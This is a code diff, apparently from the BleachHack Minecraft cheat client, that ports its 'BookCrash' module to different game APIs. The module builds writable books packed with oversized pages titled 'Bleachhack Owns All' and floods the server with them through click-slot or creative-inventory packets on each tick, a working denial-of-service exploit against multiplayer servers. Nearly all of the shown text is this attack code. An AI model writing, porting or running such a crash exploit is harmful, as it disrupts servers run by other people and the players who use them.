@@ -24,14 +24,12 @@ import bleach.hack.module.Module;
 import bleach.hack.setting.base.SettingMode;
 import bleach.hack.setting.base.SettingSlider;
 import bleach.hack.setting.base.SettingToggle;
-import bleach.hack.bleacheventbus.BleachSubscribe;
-import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
-import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
+import com.google.common.eventbus.Subscribe;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
-import net.minecraft.nbt.NbtCompound;
-import net.minecraft.nbt.NbtList;
-import net.minecraft.nbt.NbtString;
+import net.minecraft.nbt.CompoundTag;
+import net.minecraft.nbt.ListTag;
+import net.minecraft.nbt.StringTag;
 import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
 import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
@@ -58,14 +56,14 @@ public class BookCrash extends Module {
                 new SettingToggle("Auto-Off", true));
     }
 
-    @BleachSubscribe
+    @Subscribe
     public void onTick(EventTick event) {
         delay = (delay >= getSetting(2).asSlider().getValue() ? 0 : delay + 1);
         if (delay > 0) return;
 
         ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
-        NbtList list = new NbtList();
-        NbtCompound tag = new NbtCompound();
+        ListTag list = new ListTag();
+        CompoundTag tag = new CompoundTag();
         String author = "Bleach";
         String title = "\n Bleachhack Owns All \n";
 
@@ -95,7 +93,7 @@ public class BookCrash extends Module {
         } else {
             for (int i = 0; i < pages; i++) {
                 String siteContent = size;
-                NbtString tString = NbtString.of(siteContent);
+                StringTag tString = StringTag.of(siteContent);
                 list.add(tString);
             }
 
@@ -103,15 +101,12 @@ public class BookCrash extends Module {
             tag.putString("title", title);
             tag.put("pages", list);
 
-            bookObj.setSubNbt("pages", list);
-            bookObj.setNbt(tag);
+            bookObj.putSubTag("pages", list);
+            bookObj.setTag(tag);
 
             for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
                 if (getSetting(0).asMode().mode == 0) {
-                    Int2ObjectMap<ItemStack> map = new Int2ObjectOpenHashMap<>(1);
-                    map.put(0, bookObj);
-
-                    mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, bookObj, map));
+                    mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, (short) 0));
                 } else {
                     mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
                 }
@@ -123,7 +118,7 @@ public class BookCrash extends Module {
         return new String(new char[count]).replace("\0", with);
     }
 
-    @BleachSubscribe
+    @Subscribe
     private void EventDisconnect(EventReadPacket event) {
         if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().state) setToggled(false);
     }
